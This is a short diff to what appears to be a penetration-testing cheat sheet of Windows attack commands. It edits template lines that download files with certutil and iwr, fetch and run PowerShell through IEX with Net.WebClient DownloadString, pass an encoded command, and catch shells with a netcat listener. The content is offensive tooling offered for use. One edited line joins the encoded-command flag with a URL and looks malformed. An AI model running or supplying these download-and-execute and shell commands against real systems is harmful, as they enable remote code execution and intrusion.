@@ -38,12 +38,12 @@ rlwrap nc -vlnp 1234
 ```powershell
 certutil.exe -urlcache -split -f http:// .exe
 iwr http:// -outfile .exe
-powershell IEX (New-Object Net.WebClient).DownloadFile("")
+powershell.exe IEX (New-Object Net.WebClient).DownloadFile("")
 ```
 ## Download and run powershell script
 ```powershell
-powershell IEX (New-Object Net.WebClient).DownloadString("")
-https://raikia.com/tool-powershell-encoder
+powershell.exe IEX (New-Object Net.WebClient).DownloadString("")
+powershell.exe -e https://raikia.com/tool-powershell-encoder
 ```
 ## Powershell.exe Bit
 ```powershell
